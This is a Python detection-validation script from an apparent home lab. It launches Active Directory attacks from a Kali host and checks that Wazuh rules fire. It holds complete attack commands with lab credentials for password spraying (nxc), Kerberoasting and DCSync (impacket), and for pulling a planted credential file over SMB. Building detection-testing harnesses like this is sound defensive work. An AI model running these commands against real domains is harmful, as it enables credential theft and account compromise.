#!/usr/bin/env python3
# ===========================================================================
# ad-validate.py — automated AD attack -> detection validation.
#
# The atk-01 counterpart to purple-team.py. purple-team.py runs Atomic Red Team
# ENDPOINT tests on ws-01; this runs real DOMAIN attacks from atk-01 (Kali) against
# the Samba AD DC and proves the Wazuh detection fired — a repeatable "is my AD
# detection still green?" harness (and practice range).
#
# For each scenario: count the expected rule(s) in the manager's alert log, launch
# the attack from atk-01, wait, count again — a positive delta = detection fired.
# Same source-of-truth (alert-log diff) as purple-team.py, robust against
# pre-existing alerts with no indexer/timestamp dependency.
#
#   PASS = the attack ran AND the intended detection fired.
#   FAIL = a coverage gap (or the attack didn't reach the DC) — a finding, not an error.
#   SKIP = the scenario's target host is unreachable (e.g. fs-01 powered off).
#
# Weak lab creds below are already public in phase-2-identity/known-weaknesses.md.
# Run from the operator host (SSH aliases atk-01 / siem-01 / fs-01 in ~/.ssh/config):
#   ./ad-validate.py
# ===========================================================================
import subprocess
import sys
import time

SIEM = "siem-01"
SETTLE = 25          # agent -> manager -> (correlation) latency
ATTACK_TIMEOUT = 180  # secretsdump/GetUserSPNs are slow when they fail against Samba

SPRAY_USERS = "Administrator\\nasmith\\njdoe\\nbwilson\\nsvc-web\\nsvc-sql\\nsvc-backup\\nsvc-legacy"

# Each scenario runs `cmd` on `host` and expects a positive delta in `rules`.
SCENARIOS = [
    {
        "name": "Password Spray",
        "host": "atk-01",
        "cmd": (f"printf '{SPRAY_USERS}\\n' > /tmp/ad-spray-users.txt && "
                "nxc smb 10.10.10.10 -u /tmp/ad-spray-users.txt -p Summer2026 --continue-on-success"),
        "rules": ["100401"],
        "technique": "T1110.003",
        "desc": "one password x many accounts -> burst rule (T1110.003)",
    },
    {
        "name": "Kerberoasting",
        "host": "atk-01",
        "cmd": ("impacket-GetUserSPNs lab.internal/svc-sql:Summer2026 -dc-ip 10.10.10.10 -request"),
        "rules": ["100031"],
        "technique": "T1558.003",
        "desc": "request 3+ service tickets in 60s (T1558.003)",
    },
    {
        "name": "DCSync",
        "host": "atk-01",
        "cmd": ("impacket-secretsdump lab.internal/svc-backup:Backup2026@dc-01.lab.internal -just-dc-ntlm"),
        "rules": ["100080"],
        "technique": "T1003.006",
        "desc": "DsGetNCChanges from a non-DC (T1003.006)",
    },
    {
        # Requires fs-01 (weak [public] share). SKIPs cleanly when fs-01 is down.
        "name": "Credential Theft",
        "host": "atk-01",
        "requires": "fs-01",
        "cmd": ("smbclient //10.10.10.20/public -U 'lab.internal\\svc-sql%Summer2026' "
                "-c 'get map-backup-share.ps1 /tmp/loot.ps1'"),
        "rules": ["100090"],
        "desc": "read planted credential file on the weak share (T1552.001)",
    },
]


def ssh(host, cmd, timeout=90):
    try:
        return subprocess.run(["ssh", "-o", "ConnectTimeout=15", host, cmd],
                              capture_output=True, text=True, timeout=timeout)
    except subprocess.TimeoutExpired:
        return subprocess.CompletedProcess(args=[], returncode=124, stdout="", stderr="timeout")


def reachable(host):
    return ssh(host, "echo up", timeout=20).stdout.strip() == "up"


def count_rules(rule_ids):
    ids = "|".join(rule_ids)
    remote = (f"sudo grep -acE '\"id\":\"({ids})\"' /var/ossec/logs/alerts/alerts.json 2>/dev/null")
    r = ssh(SIEM, remote, timeout=30)
    for line in reversed(r.stdout.strip().splitlines()):
        if line.strip().isdigit():
            return int(line.strip())
    return 0


def main():
    print(f"\n== AD attack -> detection validation :: siem={SIEM} ==\n")
    results = []
    for s in SCENARIOS:
        req = s.get("requires")
        if req and not reachable(req):
            print(f"  [SKIP] {s['name']:17} needs {req} (unreachable)          {s['desc']}")
            results.append((s["name"], None))
            continue
        before = count_rules(s["rules"])
        t0 = time.time()
        ssh(s["host"], s["cmd"], timeout=ATTACK_TIMEOUT)
        time.sleep(SETTLE)
        delta = count_rules(s["rules"]) - before
        latency = round(time.time() - t0, 1)
        ok = delta > 0
        results.append((s["name"], ok))
        print(f"  [{'PASS' if ok else 'FAIL'}] {s['name']:17} "
              f"rules {','.join(s['rules']):8} hits={delta} {latency}s  {s['desc']}")
    ran = [r for r in results if r[1] is not None]
    passed = sum(1 for _, ok in ran if ok)
    skipped = sum(1 for _, ok in results if ok is None)
    print(f"\n== {passed}/{len(ran)} AD detections validated"
          f"{f' ({skipped} skipped)' if skipped else ''} ==\n")
    sys.exit(0 if ran and passed == len(ran) else 1)


if __name__ == "__main__":
    main()
